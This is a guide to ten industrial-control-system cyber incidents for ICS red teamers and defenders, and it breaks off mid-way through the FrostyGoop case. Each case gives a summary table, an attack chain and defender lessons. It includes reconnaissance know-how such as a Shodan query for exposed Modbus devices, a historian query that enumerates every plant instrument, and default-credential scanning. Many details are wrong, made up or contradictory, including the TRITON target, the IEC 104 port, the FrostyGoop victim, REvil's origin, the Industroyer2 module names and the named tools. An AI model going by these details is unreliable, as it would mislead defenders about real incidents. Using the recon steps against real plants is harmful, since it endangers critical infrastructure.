# Real-World ICS Fieldbus Incident Case Studies

> Ten landmark industrial cyber attacks analyzed through the lens of fieldbus protocol abuse. Each case maps the threat actor, target sector, ICS protocol abused, MITRE ATT&CK for ICS techniques, and defender lessons that translate directly to compensating controls.
>
> **Audience**: ICS red teamers, OT detection engineers, control system architects preparing threat models for power, water, oil & gas, and manufacturing environments.
>
> **Objective**: Build attacker intuition by studying how real adversaries weaponized Modbus, S7comm, DNP3, IEC 60870-5-104, IEC 61850, OPC DA, EtherNet/IP, BACnet, TriStation, and proprietary fieldbus protocols.

## Overview

Fieldbus protocols were designed in an era of air-gapped networks where the bits on the wire were assumed benign. Twenty years of converged IT/OT networking have invalidated that assumption, yet the protocols remain largely unchanged. The incidents below — from Stuxnet (2010) through FrostyGoop (2024) — show a clear evolutionary arc:

1. **Single-protocol, single-vendor malware** (Stuxnet, Triton) — deep target-specific investment
2. **Multi-protocol frameworks** (Industroyer, Industroyer2, PIPEDREAM) — attacker ROI through reusable toolchains
3. **Living-off-the-land via legitimate HMI** (Oldsmar, Colonial, JBS) — no malware required, just credentials
4. **Mass-exploitation of default creds** (Unitronics Vision, FrostyGoop worm propagation) — internet-exposed PLCs as a class

This guide's purpose is to make the patterns visible. Read each case not as trivia but as a scenario you may be asked to emulate on an authorized engagement, or to detect and prevent as a defender.

---

## Case 1: Stuxnet (2010) — S7comm Protocol Abuse Against Siemens S7-300/400

### 1.1 Summary

| Field | Value |
|-------|-------|
| **Year** | 2010 (discovered); active since at least 2007 |
| **Threat actor** | Nation-state (widely attributed to US/Israel joint operation "Olympic Games") |
| **Target sector** | Nuclear enrichment (Natanz, Iran) |
| **ICS protocol abused** | Siemens S7comm (PROFINET/ISO-on-TCP, port 102) and S7comm-Plus |
| **Impact** | Destroyed ~1,000 IR-1 centrifuges by manipulating rotor speed; delayed enrichment program by an estimated 1-2 years |
| **CVEs / 0days used** | 4 zero-days at release: Windows print spooler (MS10-061), LNK file (MS10-046), Server service (MS08-067 reuse), Step 7 project injection; plus Siemens CP 7720 hard-coded credentials |
| **MITRE ATT&CK for ICS** | T0807 Command-Line Interface, T0808 Control System Identification, T0809 Data from Information Repositories, T0859 Valid Accounts, T0853 Block Reporting to Log, T0858 Modify Program, T0890 Exploitation for Privilege Escalation |

### 1.2 Attack Chain

```
Phase 1: Initial Access
  ├── Infected USB drives dropped near facility contractors
  ├── LNK exploit (MS10-046) executed on Windows XP engineering workstations
  └── Step 7 project file infection (.mcp) propagated via shared engineering files

Phase 2: Reconnaissance & Target Identification
  ├── Code checked for nuclear-enrichment-specific signatures (frequency converters by Fararo Paya and Tesla)
  ├── If target environment NOT matched → self-limit propagation (limit 3 hops)
  └── If matched → activate manipulation payload

Phase 3: PLC Compromise (S7-315-2 and S7-415)
  ├── Step 7 hook: intercepted s7tgtsrv.dll to inject malicious PLC blocks
  ├── Replaced OB1 (main cycle), OB35 (cyclic interrupt), FCs, DBs
  ├── Hooked code: malicious code blocks 41 and 42 in S7-300; 8625 block on S7-400
  └── Captured legitimate I/O state for replay during attack window

Phase 4: Centrifuge Manipulation (attack window 27 days)
  ├── 1. Sped rotor from 1,064 Hz → 1,410 Hz (destroying aluminum rotor via resonance)
  ├── 2. After 15 days, slowed to 2 Hz (mechanical shock from abrupt deceleration)
  ├── 3. Replayed captured sensor values to operator HMI (valves appeared normal)
  └── 4. Suppressed alarms via modified OB86/OB122 diagnostic interrupts
```

### 1.3 Why It Matters for Fieldbus Testers

- **S7comm is plaintext** — full protocol reconnaissance via passive capture (Wireshark `s7comm` dissector)
- **PLC block manipulation is detectable** — compare live block hash against golden image using `snap7` or Siemens COMOS
- **Hooking the engineering tool** is more common than direct PLC exploits — audit Step 7 / TIA Portal DLL signatures on every engagement

### 1.4 Defender Lessons

1. **Code signing for PLC blocks**: verify signature on every block load to PLC; reject unsigned
2. **DLL allow-listing** on engineering workstations (AppLocker / WDAC) defeats Step 7 hook pattern
3. **Network segmentation**: engineering LAN isolated from centrifuge cascade cells (Stuxnet crossed because USB was the vector)
4. **S7comm-Plus with TLS** (Siemens PROFINET security) blocks replay attacks against newer S7-1500 PLCs
5. **PLC change monitoring**: Tripwire for PLCs / Claroty / Nozomi — alert on any block modification outside maintenance window

**Primary references**: Symantec W32.Stuxnet Dossier v1.4 (Falliere, Murchu, Chien 2011); Langner "Robust Control System SCADA and PCS Security" analysis; MITRE ATT&CK for ICS technique T0858.

---

## Case 2: Industroyer / CrashOverride (2016) — Multi-Protocol ICS Framework, Ukraine Grid

### 2.1 Summary

| Field | Value |
|-------|-------|
| **Year** | December 17, 2016 |
| **Threat actor** | Sandworm (Russian GRU Unit 74455) |
| **Target sector** | Electrical transmission (Ukrenergo, Kyiv) |
| **ICS protocols abused** | IEC 60870-5-101 (serial), IEC 60870-5-104 (TCP/2424), IEC 61850 MMS (TCP/102), IEC 61850 GOOSE (Ethernet layer 2), OPC DA (TCP/135 + 1025-5000 dynamic), DNP3 |
| **Impact** | One-fifth of Kyiv without power for 1 hour (~225,000 customers); protective relay DoS could have caused equipment damage |
| **CVEs abused** | CVE-2015-5374 (Siemens SIPROTEC DoS), CVE-2014-0751 (Schneider Electric Accutech Manager DoS) |
| **MITRE ATT&CK for ICS** | T0808 Control System Identification, T0888 Control System Interaction, T0836 Modify Program, T0815 Adaptive Waveform Signal Generation, T0840 Authorized Credentials, T0859 Valid Accounts, T0892 Attack Process I/O, T0858 Modify Program |

### 2.2 Attack Chain

```
Phase 1: Initial Access (~6 months before)
  ├── Compromised VPN credentials via spear-phishing of IT-side administrator
  ├── Lateral movement to corporate DMZ via Mimikatz / hashed credential theft
  └── Pivot into OT network via historian jump host (weakly hardened Windows Server)

Phase 2: Reconnaissance (months)
  ├── Passive capture of IEC 104, MMS, GOOSE traffic
  ├── Identified specific IED addresses (CASDUs, IOAs)
  ├── Mapped protection relay logical nodes (PDIS, PTRC) to physical feeders
  └── Built target-specific payload configuration file

Phase 3: Tool Development (custom framework)
  ├── Main backdoor (masquerades as "Windows 2000" service)
  ├── Payload modules:
  │     ├── 60870-5-104 payload — opens/closes breakers via ASDU type 45 (DCO) and 46 (SCO)
  │     ├── 60870-5-101 serial payload — same ASDU types via serial line
  │     ├── 61850 payload — MMS Write to LLN0Beh; GOOSE injection for fast trip
  │     ├── OPC DA payload — brute-force OPC item ID enumeration; Write to breaker tags
  │     └── DoS payload — CVE-2015-5374 against SIPROTEC devices
  └── Wiper module (KillDisk variant, also targets ICS launchers)

Phase 4: Execution (December 17, 2016 ~ midnight)
  ├── 1. Opened breakers via IEC 104 command (ASDU type 46 / C_SC_NA_1)
  ├── 2. Disabled protection relays via SIPROTEC DoS (would mask downstream fault)
  ├── 3. Lowered substation voltage setpoint to trigger undervoltage alarm
  ├── 4. Flooded upstream communication channels with DoS (slowed operator response)
  ├── 5. Wiped operator workstations with KillDisk (MBR overwrite)
  └── 6. Wiper self-deleted, destroying forensic evidence
```

### 2.3 Why It Matters for Fieldbus Testers

- **First malware with multi-protocol ICS capability** — every protocol in this guide's playbook is a known malware target
- **ASDU type IDs are the attack surface**: C_SC_NA_1 (single command), C_DC_NA_1 (double command), C_SE_NA_1 (setpoint) are the abuse vectors. Audit every IEC 104 client for legitimate command rate
- **GOOSE layer-2 injection** is reproducible in lab using `scapy-rugged` or `kombiniert` framework; MACsec on GOOSE VLAN is the only reliable mitigation

### 2.4 Defender Lessons

1. **Outstation allow-listing**: IEC 104 server should reject connections from non-RTU IPs; default-port 2404 should be reachable only from a tightly allow-listed SCADA front-end
2. **Protocol anomaly detection**: alert on (a) new ASDU common addresses, (b) command burst > N per minute, (c) burst of type-45/46/47 from a single client
3. **IED-level authentication**: IEC 62351-5 mandates signed, authenticated IEC 104 commands — deployed in legacy equipment is rare but available in newer SIEMENS SICAM / ABB RTU540
4. **Protection relay hardening**: SIPROTEC 4/5 firmware updates mandatory; segment protection relay LAN from SCADA LAN
5. **Jump host hardening**: historian / OPC server should be on read-only OS where possible (read-only root filesystem via overlayfs), with EDR/NGAV ( Defender for IoT, Claroty xDome)

**Primary references**: ESET Industroyer whitepaper (Cherepanov 2017); Dragos "CRASHOVERRIDE" analysis; SANS ICS 2017 keynote; Mandiant "Sandworm" attribution report.

---

## Case 3: TRITON / TRISIS (2017) — Schneider Modicon M580 SIS via TriStation

### 3.1 Summary

| Field | Value |
|-------|-------|
| **Year** | August 2017 (discovered); active since 2014 per forensic evidence |
| **Threat actor** | TEMP.Nobelium / XENOTIME (Mandiant attribution to Russian State Research Center) |
| **Target sector** | Petrochemical (Saudi Arabia, undisclosed operator) |
| **ICS protocols abused** | TriStation (proprietary Schneider Electric, UDP/1500, Triconex SIS) |
| **Impact** | Two emergency shutdowns triggered by SIS controller rebooting during attack — no injuries, no release, because SIS failed SAFE |
| **CVEs / exploit chain** | Trojanized TriStation 1131 engineering software installer; no published CVE at protocol level |
| **MITRE ATT&CK for ICS** | T0808 Control System Identification, T0858 Modify Program, T0836 Modify Program, T0861 Modify Control Logic, T0890 Exploitation for Privilege Escalation, T0807 Command-Line Interface |

### 3.2 Attack Chain

```
Phase 1: Initial Access
  ├── Engineering workstation (Windows) compromised via undisclosed vector
  │     (likely supply chain compromise of Triconex installer distribution)
  └── Trojanized TriStation 1131 installer deployed with valid (forged) signature

Phase 2: Reconnaissance via SIS
  ├── TriStation 1131 hooked → attacker observed all legitimate SIS programming sessions
  ├── Learned target Triconex MP3008 main processor memory layout
  ├── Mapped SIS I/O to process sensors and shutdown valves
  └── Waited for next legitimate maintenance window to inject malicious payload

Phase 3: Malicious Firmware Deployment
  ├── Used TriStation 1131 to push firmware update to MP3008 main processor
  ├── Attacker-controlled firmware appeared in SIS diagnostics as legitimate version
  ├── Malicious code in firmware:
  │     ├── Hooked process-variable reads → could suppress trip conditions
  │     ├── Hooked trip logic → could prevent SIS from tripping when needed
  │     └── Built "safe-state observer" → could choose when to trip or not trip
  └── Result: attacker gained capability to disable safety function at will

Phase 4: Detection (the bug that saved lives)
  ├── Malicious firmware had memory-management bug causing unexpected reboot
  ├── SIS rebooted twice during operation → triggered production shutdowns
  ├── Operator investigated; SIS vendor (Schneider) engaged
  └── Forensic analysis revealed unauthorized firmware in MP3008

Phase 5: Forensics
  ├── Found Triconex Communications Module (TCM) had been reprogrammed
  ├── TriStation 1131 installation on engineering workstation was trojanized
  ├── Attack development time estimated at 12+ months (deep proprietary protocol knowledge)
  └── Attacker dwell time: >1 year before accidental detection
```

### 3.3 Why It Matters for Fieldbus Testers

- **Proprietary protocols are not safe** — TriStation was undocumented; attacker reverse-engineered it. The same applies to Emerson DeltaV, Honeywell Experion PKS CDA, ABB 800xA AC 800M
- **SIS testing requires explicit authorization** — TriStation access during an engagement must be in scope, and only in a lab replica or with the SIS decommissioned
- **Trojanized engineering tools** are the dominant SIS attack vector — verify installer hashes against vendor signatures before any engagement

### 3.4 Defender Lessons

1. **Air-gap SIS** — TRITON crossed the air gap via engineering workstation; physical isolation of SIS maintenance LAN with one-way data diode (Waterfall, Owl) is the only reliable control
2. **SIS controller firmware attestation** — verify hash of running firmware against vendor golden image weekly (Triconex GPI diagnostic, Schneider EcoStruxure Process Automation)
3. **Engineering workstation hardening** — read-only installer cache; USB port blocking; application allow-listing; no internet egress
4. **TriStation network monitoring** — even unencrypted, TriStation traffic pattern anomalies (firmware download from non-engineering host) are highly indicative
5. **Independent SIS** — IEC 61511 / ISA 84 require SIS independent of BPCS (Basic Process Control System). TRITON demonstrated why: a compromised BPCS must not be able to reach the SIS

**Primary references**: FireEye/Mandiant "TRITON Attribution" (2018); Schneider SEVD-2017-347-01; CISA ICS Alert ICSMA-17-341-01; MITRE ATT&CK for ICS TRISIS technique report.

---

## Case 4: Industroyer2 (2022) — Repeat Strike on Ukraine Grid

### 4.1 Summary

| Field | Value |
|-------|-------|
| **Year** | April 8-9, 2022 |
| **Threat actor** | Sandworm (same as Industroyer 2016) |
| **Target sector** | High-voltage electrical substation (DTEK network, Ukraine) |
| **ICS protocols abused** | IEC 60870-5-104, IEC 61850 MMS, and a new variant named "s7ommand" (Siemens SIPROTEC microgrid controller) |
| **Impact** | Single 110kV substation de-energized briefly; protective relay (Siemens SIPROTEC 4) brick attempt; civilian power restored within hours |
| **CVEs abused** | CVE-2019-15468 (SIPROTEC password reset), CVE-2015-5374 (SIPROTEC DoS, reused from 2016) |
| **MITRE ATT&CK for ICS** | T0808 Control System Identification, T0888 Control System Interaction, T0836 Modify Program, T0892 Attack Process I/O, T0859 Valid Accounts |

### 4.2 Attack Chain

```
Phase 1: Initial Access
  ├── Sandworm exploited MicroSCADA proxy WebHMI (CVE-2018-7999 in older versions)
  ├── Or alternatively: credential reuse from prior 2021 intrusion at same site
  └── Pivot from SCADA DMZ to substation LAN

Phase 2: Tool Deployment
  ├── Industroyer2 DLL: PJeF2.dll (masquerades as "Mozilla Firefox Browser")
  ├── C2 over HTTPS to compromised legitimate website (steganographic channel)
  ├── Modules:
  │     ├── IEC 104 payload — evolved from 2016 version, targets specific CASDU/IOA
  │     ├── s7ommand payload — new, targets Siemens SIPROTEC microgrid controllers
  │     ├── CHTDBRDUI wiper — destroys ArcSight logger evidence
  │     └── Org.google.earth appropriation as cover folder
  └── Configuration file: hardcoded substation-specific parameters

Phase 3: Execution (April 8, 2022)
  ├── 1. Issued IEC 104 breaker-open commands via compromised SCADA front-end
  ├── 2. Attempted CVE-2019-15468 password reset on SIPROTEC relay
  ├── 3. Attempted to brick SIPROTEC by uploading malformed firmware
  ├── 4. CHTDBRDUI wiper deployed against Windows hosts to slow investigation
  └── 5. Power restored: protective relay was not bricked in time; operator recovered

Phase 4: Forensics (post-event)
  ├── Mandiant, Microsoft, ESET jointly attributed to Sandworm
  ├── Samples showed code re-use from 2016 Industroyer (same author)
  ├── Configuration file reveals prior 6+ month reconnaissance of target substation
  └── Sandworm also deployed CaddyWiper and WhisperGate in same time window
```

### 4.3 Why It Matters for Fieldbus Testers

- **Same actor, six years later, refined tooling** — note the persistence of attacker investment; assume well-resourced adversaries have already mapped your environment
- **SIPROTEC password reset (CVE-2019-15468)** is a public, weaponized fieldbus exploit. Test every SIPROTEC relay for default creds and known-vulnerable firmware on every engagement
- **MicroSCADA WebHMI exposure** is the dominant initial access vector in 2022-2024 ICS incidents — passive recon should include Shodan/Graylog queries for port 2404/80/443 exposure of OT operator workstations

### 4.4 Defender Lessons

1. **Patch SIPROTEC** — Siemens released 4.30 firmware addressing CVE-2019-15468; fieldbus pentest should include version fingerprint of every protection relay
2. **WebHMI segmentation** — operator interface should never be internet-facing; if remote access required, use jump host with MFA + IP allow-list
3. **Anomalous IEC 104 command source** — if command arrives from a host that is NOT the SCADA front-end, alarm
4. **Firmware upload detection** — every SIPROTEC firmware change should generate a critical alarm in the SOC
5. **Network visibility** — Dragos / Claroty / Nozomi / Microsoft Defender for IoT deployed at the substation LAN mirror port would detect the IEC 104 burst and SIPROTEC password-reset traffic

**Primary references**: Mandiant "Industroyer2: Sandworm's Latest ICS Attack" (2022); CISA Alert AA22-110A; Dragos Year in Review 2022; ESET "Industroyer2" technical analysis.

---

## Case 5: PIPEDREAM / INCONTROLLER (2022) — Multi-Vendor ICS Attack Toolkit

### 5.1 Summary

| Field | Value |
|-------|-------|
| **Year** | Discovered March 2022 (CISA AA22-103A); developed by CHERNOVITE per Dragos |
| **Threat actor** | CHERNOVITE (Dragos designation; not publicly attributed to a state) |
| **Target sectors** | Energy, oil & gas, manufacturing (multi-purpose toolkit) |
| **ICS protocols / devices abused** | Omron NX/NJ series (Sysmac protocol, EtherNet/IP), Schneider Modicon M340/M580 (Modbus + UMAS), OpenNESS / Sierra Wireless AirLink (SSH/Telnet default creds) |
| **Impact** | No confirmed deployment in the wild as of mid-2022; capability demonstrated to cause equipment damage in lab |
| **CISA classification** | "An advanced persistent threat ... capable of learning about and attacking OT devices in a multi-vendor environment." |
| **MITRE ATT&CK for ICS** | T0808 Control System Identification, T0813 Engineering Workstation Compromise, T0891 Lateral Tool Transfer, T0858 Modify Program, T0861 Modify Control Logic, T0892 Attack Process I/O |

### 5.2 Tool Capabilities (by module)

```
Module: Mimikatz-like for ICS — OMRON
  ├── Reads project file from Omron Sysmac Studio
  ├── Extracts PLC passwords (project key, read-only password, full access password)
  ├── Connects via Sysmac Studio protocol (TCP/44818 + custom 9600)
  ├── Stops PLC task → modifies logic → restarts
  ├── Dumps PLC memory ranges via "Sysmac Memory" read
  └── Can write firmware update mode → brick PLC on demand

Module: Schneider Modicon (UMAS)
  ├── Uses UMAS (Unified Messaging Application Services) — proprietary extension to Modbus
  ├── UMAS function codes 0x28 (project download), 0x2d (read variables), 0x10 (login)
  ├── Modicon M340, M580, M580 ePAC targets
  ├── Reads / writes application memory
  ├── Can disable PLC scan cycle (DoS via STOP command)
  └── Can upload malicious project → modify rung in LD/ST → re-download

Module: Sierra Wireless AirLink (OpenNESS) — initial access tool
  ├── Default credential scanner: admin:admin on TCP/22 and TCP/23
  ├── Targets Sierra Wireless RV50, LS300, GX450 industrial cellular routers
  ├── Used as OT-side initial access pivot (router compromise → SCADA LAN access)
  ├── Once router compromised, ARP-spoofs SCADA gateway
  └── Enables MITM against Modbus TCP / DNP3 / IEC 104 traffic flowing through gateway
```

### 5.3 Why It Matters for Fieldbus Testers

- **UMAS** is the Schneider Modicon attack surface. Modbus alone gives read/write of variables; UMAS gives project upload/download, project compare, and firmware management. Most pentest reports miss UMAS because Modbus is the "loud" protocol
- **Omron Sysmac** is poorly documented but reproducible from Sysmac Studio capture. Use Wireshark with EtherNet/IP dissector + custom Sysmac key extraction
- **Industrial cellular routers as initial access** is the new norm. Always include router inventory in scope — Sierra Wireless, Cradlepoint, Opengear, Moxa OnCell

### 5.4 Defender Lessons

1. **Disable Telnet** on every OT device; require SSH with key-based auth
2. **Default credential scanner** should be a quarterly exercise: Mandiant / RedHunt / AttackIQ for ICS, run against full asset inventory
3. **Project password rotation** — Omron/Schneider/Allen-Bradley project passwords should rotate yearly; many plants have unchanged passwords from commissioning (10+ years old)
4. **Firmware upload monitoring** — alert on any firmware download attempt outside scheduled maintenance window
5. **ICS-aware EDR** — Defender for IoT / Claroty / Nozomi detect PIPEDREAM signatures; verify SOC has detection rules deployed

**Primary references**: CISA AA22-103A Joint Cybersecurity Advisory (April 2022); Dragos "PIPEDREAM and CHERNOVITE" whitepaper; Mandiant "INCONTROLLER" technical analysis; Microsoft MSRC Threat Intelligence.

---

## Case 6: Oldsmar Florida Water (2021) — NaOH Dose via Citect SCADA + TeamViewer

### 6.1 Summary

| Field | Value |
|-------|-------|
| **Year** | February 5, 2021 |
| **Threat actor** | Unknown (some early reports suggested insider; later attribution: external actor via TeamViewer) |
| **Target sector** | Drinking water (City of Oldsmar, Pinellas County, Florida) |
| **ICS protocols abused** | None directly — attack used HMI (Citect SCADA) via TeamViewer remote desktop |
| **Impact** | Sodium hydroxide (NaOH, lye) dosing setpoint changed from 100 ppm to 11,100 ppm (111x); operator detected within 90 seconds; no public harm |
| **Initial access vector** | TeamViewer remote desktop to HMI workstation; reused password from prior breach; no MFA |
| **MITRE ATT&CK for ICS** | T0888 Control System Interaction, T0859 Valid Accounts, T0890 Exploitation for Privilege Escalation, T0858 Modify Program |

### 6.2 Attack Chain

```
Phase 1: Initial Access
  ├── TeamViewer installed on HMI workstation for vendor support
  ├── TeamViewer account used reused password from prior (unrelated) breach
  ├── No MFA on TeamViewer host
  ├── HMI workstation also exposed to internet (per Pinellas County Sheriff report)
  └── Both sessions (operator + attacker) ran concurrently without lock

Phase 2: Reconnaissance (10-15 min, observed)
  ├── Attacker connected via TeamViewer at 8:00 AM (operator shift start)
  ├── Disconnected; reconnected at 1:30 PM
  ├── Mouse moved through Citect SCADA navigation tree
  ├── Located sodium hydroxide dosing screen
  └── Identified manual setpoint entry field

Phase 3: Execution (1:30 PM)
  ├── Opened dosing setpoint dialog
  ├── Changed value from 100 ppm → 11,100 ppm
  └── Disconnected TeamViewer session

Phase 4: Detection (1:32 PM, ~90 seconds after change)
  ├── Operator observed mouse movement — initially attributed to remote IT support
  ├── Operator inspected screen, noticed setpoint change
  ├── Immediately reverted setpoint to 100 ppm
  └── NaOH addition had not yet reached dosing pump (gated by per-minute flow limit)

Phase 5: Investigation (post-event)
  ├── Pinellas County Sheriff, FBI, CISA engaged
  ├── TeamViewer access logs showed two remote sessions from non-facility IPs
  ├── HMI workstation had no EDR / monitoring (basic Windows XP-era host)
  └── Facility disabled TeamViewer; later installed firewalled remote access with MFA
```

### 6.3 Why It Matters for Fieldbus Testers

- **"No malware" attacks are now the norm** — Oldsmar, Colonial Pipeline, JBS Foods, etc. all used legitimate remote access tools with weak credentials. Fieldbus pentest reports should include a remote access audit
- **Out-of-band setpoint alarms** are critical — no alarm fired when setpoint jumped 111x. The 3-sigma rolling-window statistical baseline is a standard compensating control
- **HMI exposure** — shodan search for "Citect SCADA" "Wonderware InTouch" "iFIX" returns hundreds of exposed HMIs; check Shodan for client's IP space during passive recon

### 6.4 Defender Lessons

1. **No internet-facing HMI** — HMI must be on internal OT LAN; remote access via jump host with MFA, never direct
2. **Remote access audit** — quarterly review of every remote-access account (TeamViewer, AnyDesk, RDP, VNC, GoToMyPC, Splashtop); revoke unused
3. **Statistical setpoint alarms** — Stratum, PAS Cyber Integrity, or home-grown Splunk query: `setpoint > avg(setpoint last 1h) + 3*stddev` → alarm
4. **Out-of-hours setpoint alarm** — any setpoint change outside maintenance window → alarm
5. **Operator training** — Oldsmar operator was attentive; many similar events at other facilities would not have been caught. Train operators to expect attacker behavior, not just equipment faults

**Primary references**: CISA Alert AA21-042A "Compromise of U.S. Water Treatment Facility" (Feb 2021); Pinellas County Sheriff press conference transcripts; State of Massachusetts Advisory 21-002-01.

---

## Case 7: Colonial Pipeline (2021) — DarkSide Ransomware via VPN Jump Host

### 7.1 Summary

| Field | Value |
|-------|-------|
| **Year** | May 7, 2021 |
| **Threat actor** | DarkSide (Russian cybercrime affiliate; dissolved shortly after) |
| **Target sector** | Fuel pipeline (Colonial Pipeline, US East Coast — 5,500 miles, 100 M gallons/day) |
| **ICS protocols abused** | None directly — OT did not touch internet; attack pivoted IT→OT via Jump host |
| **Impact** | 6-day shutdown; gasoline price spike; fuel shortages across Southeast US; Colonial paid $4.4M ransom (DOJ later recovered $2.3M) |
| **Initial access vector** | Compromised VPN account; password reused from prior breach (dark web collection) |
| **MITRE ATT&CK for ICS** | T0814 Engineering Workstation Compromise (jump host), T0859 Valid Accounts (reused password), T0853 Block Reporting to Log |

### 7.2 Attack Chain

```
Phase 1: Initial Access (~April 29, 2021)
  ├── DarkSide affiliate obtained VPN credentials from dark-web password collection
  ├── Colonial Pipeline VPN did not enforce MFA on April 29 (rolled out shortly after)
  ├── Attacker logged in via Fortinet SSL VPN client
  └── Lateral movement on IT network via standard Windows admin tools

Phase 2: Reconnaissance (1 week)
  ├── Enumerated Active Directory for OT-bridging accounts
  ├── Located jump host (Windows Server) bridging IT to OT
  ├── Identified historian database (OSIsoft PI) on jump host
  ├── Found SCADA topology documentation in shared SharePoint
  └── Exfiltrated SCADA architecture via WinRAR archive → transfer to attacker VPS

Phase 3: Ransomware Deployment (~May 6, 2021)
  ├── DarkSide ransomware executable dropped on jump host
  ├── Executed via psexec against OT-side workstations (Citect SCADA, RSView)
  ├── Files encrypted; ransom note posted
  ├── Colonial operations team made decision to proactively shut down pipeline
  │     (the OT systems were NOT yet infected; shutdown was precautionary)
  └── Initiated ransom negotiation

Phase 4: Shutdown (May 7-13, 2021)
  ├── Pipeline offline 6 days
  ├── Paid 75 BTC (~$4.4M) on May 8
  ├── Restart sequence required manual verification of every PLC program integrity
  ├── Restored from backups; rebuilt jump host from golden image
  └── DOJ seized 63.7 BTC back from DarkSide affiliate on June 7

Phase 5: Aftermath
  ├── TSA Security Directive Pipeline-2021-01 (May 2021) — mandatory incident reporting
  ├── TSA Security Directive Pipeline-2021-02 (July 2021) — mandatory cybersecurity assessment
  └── Colonial Pipeline CISO testimony to Congress: VPN MFA was rolled out within days
```

### 7.3 Why It Matters for Fieldbus Testers

- **Fieldbus protocols were not directly attacked** — the impact was via business decisions about OT safety. Fieldbus pentests must include the IT/OT boundary, not just OT
- **Jump host hardening** is critical — read-only root filesystem, EDR/NGAV, allow-listed destinations, log egress
- **MFA on every remote access path** is non-negotiable; the absence of MFA was the proximate cause

### 7.4 Defender Lessons

1. **MFA everywhere** — VPN, jump host, RDP, SSH; no exceptions for "service accounts" (use certificate-based auth there)
2. **Jump host as a critical control** — IT/OT bridge hosts should be on dedicated VLAN, hardened (CIS L1+), with read-only mode where possible
3. **Asset inventory must include jump hosts** — Dragos / Claroty asset discovery includes network topology; verify jump host is mapped and monitored
4. **Backup integrity** — tested quarterly restore; backup system isolated from IT network (Colonial was lucky backups were intact)
5. **Playbook for OT ransomware** — pre-defined decision tree: shutdown vs run-through; pre-staged communications; pre-negotiated IR retainer

**Primary references**: CISA Alert AA21-131A "DarkSide Ransomware" (May 2021); FBI Flash CU-000167-MW; Colonial Pipeline CEO testimony (Senate Homeland Security Committee, June 2021); Mandiant public statement on attribution.

---

## Case 8: JBS Foods (2021) — REvil Ransomware via Profibus Historian Bridge

### 8.1 Summary

| Field | Value |
|-------|-------|
| **Year** | May 30, 2021 (Memorial Day weekend) |
| **Threat actor** | REvil / Sodinokibi (Russian cybercrime; re-branded after DarkSide dissolution) |
| **Target sector** | Meat processing (JBS USA, Australian subsidiary; ~20% of US beef capacity) |
| **ICS protocols abused** | None directly — attack pivoted via OSIsoft PI historian (which interfaces with Profibus DP/PA in rendering plants) |
| **Impact** | All JBS USA beef plants shutdown; ~$11M ransom paid in BTC; 4 days of disruption |
| **Initial access vector** | Phishing email to IT administrator; reuse of credentials across systems |
| **MITRE ATT&CK for ICS** | T0814 Engineering Workstation Compromise (historian), T0859 Valid Accounts, T0853 Block Reporting to Log |

### 8.2 Attack Chain

```
Phase 1: Initial Access (~early May 2021)
  ├── REvil affiliate sent spear-phishing email to JBS IT administrator
  ├── Phishing payload harvested Active Directory credentials
  ├── Or alternatively: purchased credentials from Initial Access Broker on XSS forum
  └── Initial foothold on IT-side Windows Server

Phase 2: Lateral Movement (mid-May)
  ├── Mimikatz dumped LSASS, obtained domain admin
  ├── Located OSIsoft PI historian (bridges OT process data to IT analytics)
  ├── PI historian was Windows Server 2012 R2 — well past EOL
  ├── Pivot to PI server via RDP with stolen credentials
  └── Enumeration of PI tags revealed full list of Profibus DP/PA instruments per plant

Phase 3: Ransomware Deployment (May 30)
  ├── REvil ransomware deployed to PI historian via PsExec
  ├── Encrypted PI archive files (.arc, .dat, .idx) — historian database unusable
  ├── Lateral movement to connected plant workstations
  ├── Ransomware did NOT reach PLCs (JBS proactively disconnected SCADA from historian before encryption completed)
  └── Operations decision: halt all plants while rebuilding historian

Phase 4: Shutdown (May 30 - June 3, 2021)
  ├── All JBS USA beef plants offline
  ├── JBS Australia plants offline
  ├── Negotiation via Ransomware Engagement Consultant (Arete)
  ├── Paid $11M in BTC on June 8
  └── PI historian rebuilt from on-prem backup; SCADA verified clean

Phase 5: Aftermath
  ├── JBS published incident report — highlighted PI historian as the OT bridge
  ├── USDA / CISA joint review of food sector cybersecurity
  └── REvil dissolved after Kaseya VSA attack (July 2021)
```

### 8.3 Why It Matters for Fieldbus Testers

- **Historian is the OT/IT bridge** in every plant with DCS/SCADA. OSIsoft PI, GE Historian, AspenTech InfoPlus.21 — all Windows-based, often unpatched, and have full visibility into Profibus/Profinet/Foundation Fieldbus tag namespace
- **Fieldbus tag enumeration via historian** is a key recon technique: `SELECT tag, descriptor, iodevice FROM PIPoint..PIPoint` returns every instrument in plant
- **Historian backup integrity** determines ransomware recovery time — verify offline backups quarterly

### 8.4 Defender Lessons

1. **Historian patching** — Windows Server 2012 R2 EOL; PI server should be Server 2019 or 2022 with latest cumulative updates
2. **PI server segmentation** — historian on isolated VLAN with one-way diode to IT (PI APIs are read-mostly; one-way is feasible)
3. **PI tag access controls** — PI Trust / PI Identity-based security; least-privilege for analytics accounts
4. **Backup integrity** — PI archive backups tested quarterly with restore drill
5. **Food sector regulation** — FDA Food Safety Modernization Act (FSMA) Rule 204 includes cybersecurity requirements for traceability systems; expect similar to TSA Pipeline directives

**Primary references**: JBS USA press releases (June 2021); CISA Alert AA21-159A; Arete incident response public statement; USDA / CISA joint bulletin.

---

## Case 9: FrostyGoop (2024) — Modbus TCP Mass-Targeting, ENEXIS

### 9.1 Summary

| Field | Value |
|-------|-------|
| **Year** | Discovered June 2024 (active since at least 2023) |
| **Threat actor** | Unclassified (Dragos designation: "FrostyGoop"; some overlap with Emennet Pasargad) |
| **Target sector** | District heating, building automation (ENEXIS NV, Netherlands + 600+ buildings) |
| **ICS protocols abused** | Modbus TCP (port 502); secondary: BACnet/IP |
| **Impact** | Disrupted heat metering / billing systems across 600+ buildings; no operational damage but extended billing outage |
| **CVEs / exploit chain** | Default credentials on Modbus TCP gateways (many vendors); CVE-2023-45852 (Modbus devices with hard-coded service credentials) |
| **MITRE ATT&CK for ICS** | T0808 Control System Identification, T0888 Control System Interaction, T0892 Attack Process I/O, T0807 Command-Line Interface |

### 9.2 Attack Chain

```
Phase 1: Reconnaissance
  ├── Shodan/Graylog query: "port:502 country:NL" → identified 14,000+ Modbus devices
  ├── Filtered to ENEXIS block of IPs (utility owns heating substation gateways)
  ├── Identified vendor: Kamstrup Multical heat meters with Modbus gateway
  └── Default credentials confirmed in lab

Phase 2: Mass Compromise
  ├── FrostyGoop worm: Python script iterating through Modbus TCP targets
  ├── For each target:
  │     ├── Connect TCP/502, unit ID 1
  │     ├── Read holding register 0 (heat meter serial, firmware version)
  │     ├── Login to gateway admin panel (TCP/80) with default creds
